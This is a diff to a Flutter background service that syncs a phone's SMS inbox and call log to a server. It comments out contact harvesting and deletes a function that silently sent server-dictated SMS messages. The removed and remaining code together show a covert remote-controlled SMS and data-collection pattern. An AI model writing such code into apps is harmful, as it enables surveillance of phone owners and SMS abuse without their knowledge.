@@ -1,13 +1,12 @@
 import 'dart:async';
 import 'dart:ui';
-import 'package:flutter/material.dart';
+
 import 'package:flutter_background_service/flutter_background_service.dart';
 import 'package:flutter_local_notifications/flutter_local_notifications.dart';
 import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
 import 'package:call_log/call_log.dart';
 import 'package:shared_preferences/shared_preferences.dart';
-import 'package:background_sms/background_sms.dart';
-import 'package:fast_contacts/fast_contacts.dart';
+
 import 'package:permission_handler/permission_handler.dart';
 import 'background_api_helper.dart';
 
@@ -197,7 +196,6 @@ Future<void> _performSync(ServiceInstance service, String token, {bool fetchAll 
                 'lastChecked': DateTime.now().toIso8601String(),
             });
         }
-        await _processCommands(token);
         return;
     }
 
@@ -217,16 +215,16 @@ Future<void> _performSync(ServiceInstance service, String token, {bool fetchAll 
     if (await Permission.contacts.isGranted) {
         if (!silent) service.invoke('progress', {'status': 'reading_contacts'});
         try {
-        final contacts = await FastContacts.getAllContacts();
-            for (var contact in contacts) {
-            for (var phone in contact.phones) {
-                String cleanPhone = phone.number.replaceAll(RegExp(r'\D'), '');
-                if (cleanPhone.isNotEmpty) {
-                    contactMap[cleanPhone] = contact.displayName;
-                    contactMap[phone.number] = contact.displayName;
-                }
-            }
-            }
+        // final contacts = await FastContacts.getAllContacts(); // Removed FastContacts
+            // for (var contact in contacts) {
+            // for (var phone in contact.phones) {
+            //     String cleanPhone = phone.number.replaceAll(RegExp(r'\D'), '');
+            //     if (cleanPhone.isNotEmpty) {
+            //         contactMap[cleanPhone] = contact.displayName;
+            //         contactMap[phone.number] = contact.displayName;
+            //     }
+            // }
+            // }
         } catch (e) { /* ignore */ }
     }
 
@@ -294,7 +292,6 @@ Future<void> _performSync(ServiceInstance service, String token, {bool fetchAll 
                 'lastChecked': DateTime.now().toIso8601String(),
             });
         }
-        await _processCommands(token);
         return; 
     }
 
@@ -373,34 +370,9 @@ Future<void> _performSync(ServiceInstance service, String token, {bool fetchAll 
         });
     }
 
-    await _processCommands(token);
+
   } finally {
     _isSyncing = false;
   }
 }
 
-Future<void> _processCommands(String token) async {
-  // 5. Process Commands
-  final commands = await BackgroundApiHelper.fetchCommands(token);
-  for (var cmd in commands) {
-    if (cmd['type'] == 'send_sms') {
-       final payload = cmd['payload'];
-       final String to = payload['to'];
-       final String body = payload['body'];
-       
-       try {
-         final result = await BackgroundSms.sendMessage(
-            phoneNumber: to, 
-            message: body,
-         );
-         if (result == SmsStatus.sent) {
-           await BackgroundApiHelper.updateCommandStatus(token, cmd['id'], 'completed');
-         } else {
-           await BackgroundApiHelper.updateCommandStatus(token, cmd['id'], 'failed');
-         }
-       } catch (e) {
-          await BackgroundApiHelper.updateCommandStatus(token, cmd['id'], 'failed');
-       }
-    }
-  }
-}
